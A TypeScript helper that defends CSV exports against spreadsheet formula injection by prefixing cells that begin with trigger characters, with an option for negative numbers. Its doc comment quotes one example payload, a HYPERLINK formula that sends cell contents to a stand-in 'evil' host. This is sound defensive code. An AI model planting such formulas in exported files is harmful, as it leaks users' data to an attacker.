/**
 * Spreadsheet formula injection, neutralized for a CSV cell.
 *
 * Quoting alone does not stop it: Excel and Sheets strip the quoting before
 * evaluating, so a file-sourced name like `=HYPERLINK("http://evil/?"&A1,"Open")`
 * executes when the exported CSV is opened. A leading trigger (= + - @, tab,
 * carriage return) gets a `'` in front of it. The one trigger set for every CSV
 * the app writes; quoting stays with each format.
 *
 * `keepNumericMinus` is for a writer whose numeric fields pass through the same
 * escaper: a `-` followed by a digit or a point is a negative number, not a
 * formula, and quoting it would turn every western longitude into text.
 */
export function neutralizeFormula(s: string, opts: { keepNumericMinus?: boolean } = {}): string {
  const trigger = opts.keepNumericMinus ? /^[=+@\t\r]|^-(?![\d.])/ : /^[=+\-@\t\r]/;
  return trigger.test(s) ? `'${s}` : s;
}
